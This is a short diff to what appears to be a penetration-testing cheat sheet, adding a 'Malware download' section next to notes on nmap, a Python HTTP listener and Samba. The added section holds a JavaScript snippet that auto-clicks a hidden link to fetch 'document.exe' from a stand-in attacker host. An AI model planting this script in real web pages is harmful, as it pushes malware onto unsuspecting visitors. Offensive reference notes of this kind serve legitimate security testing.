@@ -363,6 +363,14 @@ For UDP use -sU
 ##### Listening with python http server
     python3 -m http.server <listening-port>
 
+#### Malware download
+
+    <script>var link = document.createElement('a');
+    link.href = 'http://<attacker-ip>/document.exe'; // document.exe is the malware
+    link.download = '';
+    document.body.appendChild(link);
+    link.click();</script>
+
 # Lexical
 ## Samba
 Search also: smb
